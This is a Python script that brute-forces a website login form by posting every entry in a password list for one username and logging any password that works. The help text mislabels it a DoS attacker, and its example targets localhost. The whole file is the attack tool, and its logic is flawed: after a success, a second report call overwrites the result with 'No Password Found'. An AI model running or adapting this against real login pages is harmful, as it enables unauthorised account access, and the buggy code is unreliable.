import requests
import time
import sys
from bs4 import BeautifulSoup
from datetime import datetime
URL = str(sys.argv[1])
def reper(tried, found, took, started, status):
    if status != False:
        x = f'''

            ****************************
            Brute Force By Khalid Obaide
            ****************************
                        [report]

            Passowrd Tried : {tried}\n
            Password Found : {found}\n
            Attack Took    : {took}\n
            Attack Started : {started}\n

        '''
    else:
        x = f'''

            ****************************
            Brute Force By Khalid Obaide
            ****************************
                        [report]

            Passowrd Tried : {tried}\n
            Password Found : No Password Found\n
            Attack Took    : {took}\n
            Attack Started : {started}\n

        '''
    print(x)
    f = open(REPORT, 'w')
    f.write(x)
    f.close()
if str(URL) == 'help':
    help_string = f'''

        *****************************
        Dos Attacker by Khalid Obaide
        *****************************

        usage : use this to do Dos attack on websites

        $1 : The website Url
        $2 : The Password List File
        $3 : The Username !!!
        $4 : The Report File Name 

        example : python3 brute.py http://127.0.0.1:8000 ./password_list.txt KhalidObaide ./log.txt

    '''
    print (help_string)
else:
    PASSLIST = str(sys.argv[2])
    PASSES = open(PASSLIST, 'r').read().splitlines()
    USERNAME = str(sys.argv[3])
    REPORT = str(sys.argv[4])
    tried = 0
    c_time = time.time()
    attack_started = datetime.now()
    try:
        test_data = {
            'username' : 'Test Username',
            'password': 'Test Password',
        }
        requests.post(URL, test_data)
    except:
        print (f'''
        *****************************
        Dos Attacker by Khalid Obaide
        *****************************
                    [error]

        [!!] Cannot Get The Url 

        ''')
        exit()
    for password in PASSES:
        form_data = {
            'username': USERNAME,
            'password': password,
        }
        page = requests.post(URL, form_data)
        soup = BeautifulSoup(page.content, 'html.parser')
        print (f'Trying : {password}')
        if str(soup) == 'YAYA Got hacked ':
            c_time = time.time() - c_time
            reper(str(tried), str(password), str(c_time), str(attack_started), True)
            break
        else:
            pass
        tried -= -1
    c_time = time.time() - c_time
    reper(str(tried), 'No Password Found :(', str(c_time), str(attack_started), True)
# Thanks for khalid obaide Creator of this tool